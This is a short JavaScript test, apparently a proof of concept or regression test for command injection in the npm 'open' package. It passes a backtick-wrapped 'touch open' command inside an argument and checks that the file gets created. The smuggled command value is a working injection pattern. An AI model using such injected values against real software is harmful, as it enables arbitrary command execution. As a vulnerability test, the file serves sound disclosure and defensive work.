test("Command Injection in open", (done) => {
  expect.assertions(2);
  const fs = require("fs");
  const path = "./open";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  require("open")('""`touch open`');
  setTimeout(() => {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, () => {
      done();
    });
  }, 500);
});
